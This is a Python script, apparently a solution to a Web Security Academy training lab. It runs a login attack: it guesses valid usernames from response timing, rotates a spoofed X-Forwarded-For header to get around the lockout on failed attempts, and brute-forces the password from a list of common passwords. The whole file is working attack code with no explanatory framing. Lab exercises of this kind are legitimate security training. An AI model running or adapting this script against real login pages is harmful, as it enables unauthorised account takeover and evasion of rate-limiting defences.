import requests
import os

usernames = ["carlos","root","admin","test","guest","info","adm","mysql","user","administrator","oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico","acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit","admin","administracion","administrador","administrator","administrators","admins","ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda","agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts","alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce","announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple","application","applications","apps","appserver","aq","ar","archie","arcsight","argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at","athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"]
passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]
url = "https://[].web-security-academy.net/" # change this
username_and_time = []

# find username
for username in usernames:
    response = requests.post(url + "login", data={"username": username, "password": "password"*125},headers={"X-Forwarded-For": os.urandom(16).hex()})
    while "You have made too many incorrect login attempts. Please try again in 30 minute(s)" in response.text:
        response = requests.post(url + "login", data={"username": username, "password": "password"},headers={"X-Forwarded-For": os.urandom(16).hex()})
    print(f"[{usernames.index(username)}/{len(usernames)}] Username: " + username + " || time: ",response.elapsed.total_seconds())
    username_and_time.append((username,response.elapsed.total_seconds()))
index = [int(t) for u,t in username_and_time].index(max([int(t) for u,t in username_and_time]))
username = username_and_time[index][0]

# find password
for password in passwords:
    response = requests.post(url + "login", data={"username": username, "password": password},headers={"X-Forwarded-For": os.urandom(16).hex()})
    if "Invalid username or password" not in response.text:
        print(f"[{passwords.index(password)}/{len(passwords)}] Password: " + password + " found")
        break
    else:
        print(f"[{passwords.index(password)}/{len(passwords)}] Password: " + password + " failed")

print("---------------------------")
print("Username: " + username)
print("Password: " + password)
print("---------------------------")
